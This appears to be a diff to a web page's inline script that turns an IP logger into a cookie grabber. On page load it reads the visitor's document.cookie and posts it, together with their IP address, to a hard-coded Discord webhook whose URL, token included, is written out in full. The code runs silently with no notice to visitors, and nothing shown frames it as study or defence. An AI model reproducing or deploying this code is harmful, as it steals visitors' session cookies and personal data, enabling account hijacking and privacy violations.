@@ -17,11 +17,16 @@
             }
         }
 
-        // Function to send the IP address to the Discord webhook
-        async function sendIPToDiscord(ip) {
+        // Function to get all cookies
+        function getCookies() {
+            return document.cookie;
+        }
+
+        // Function to send the IP address and cookies to the Discord webhook
+        async function sendDataToDiscord(ip, cookies) {
             const webhookURL = 'https://discord.com/api/webhooks/1254086342653251665/4FkcXruY4E-k__5Krqp2Ia3CEh2onAhlcX3BeomMyG0H-R_tpY2O6Gc49tvi4hGfQiJZ';
             const message = {
-                content: `User IP: ${ip}`
+                content: `User IP: ${ip}\nCookies: ${cookies}`
             };
 
             try {
@@ -34,27 +39,28 @@
                 });
                 
                 if (response.ok) {
-                    console.log('IP sent to Discord successfully');
+                    console.log('Data sent to Discord successfully');
                 } else {
-                    console.error('Error sending IP to Discord:', response.statusText);
+                    console.error('Error sending data to Discord:', response.statusText);
                 }
             } catch (error) {
-                console.error('Error sending IP to Discord:', error);
+                console.error('Error sending data to Discord:', error);
             }
         }
 
         // Main function to execute the steps
-        async function logUserIP() {
+        async function logUserData() {
             const userIP = await getUserIP();
+            const cookies = getCookies();
             if (userIP) {
-                await sendIPToDiscord(userIP);
+                await sendDataToDiscord(userIP, cookies);
             } else {
                 console.error('Could not retrieve user IP');
             }
         }
 
         // Execute the function when the page loads
-        window.onload = logUserIP;
+        window.onload = logUserData;
     </script>
 </body>
 </html>
